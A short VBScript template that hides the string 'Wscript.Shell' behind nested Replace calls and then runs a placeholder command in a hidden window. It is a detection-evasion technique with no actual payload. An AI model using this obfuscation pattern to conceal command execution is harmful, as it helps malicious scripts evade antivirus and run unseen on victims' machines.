' Obfuscated Sentence Structure: sentence + ".SH"
' First replace will replace the sentence with Wscript
' Second replace will replace SH with Shell
' so it becomes Wscript.Shell

Set var1 = CreateObject(Replace(Replace("OBFUSCATED_SENTENCE","RANDOM_SENTENCE","Wscript"),"SH", "Shell"))

var1.Run OBFUSCATED_COMMAND_HERE , 0, True